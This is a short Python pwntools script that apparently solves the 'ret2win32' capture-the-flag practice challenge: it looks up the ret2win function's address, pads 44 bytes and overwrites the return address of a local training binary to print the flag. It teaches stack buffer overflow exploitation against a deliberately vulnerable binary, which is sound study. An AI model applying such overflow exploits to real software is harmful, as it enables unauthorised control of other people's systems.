#!/usr/bin/env python
# coding: utf-8
from pwn import *

def find_offset(challenge_binary, winning_function):
    e = ELF(challenge_binary)
    offset = e.symbols[winning_function]
    info("Found offset %s for target function %s" %(hex(offset), winning_function))
    offset = p32(offset)
    return offset

def build_exploit(challenge_binary):
    winning_function = "ret2win"
    junk_len = 44
    ropchain = find_offset(challenge_binary, winning_function)
    buffer = "A"*junk_len + ropchain
#    print buffer
    return buffer

def main():
    challenge_binary = "./challenges/ret2win32"
    buffer = build_exploit(challenge_binary) # build our buffer/gadgets to send
    p = process(challenge_binary)
    p.sendline(buffer)
    p.recvuntil("Here's your flag:")
    flag = p.recvline()
    success(flag)

if __name__ == "__main__":
    main()
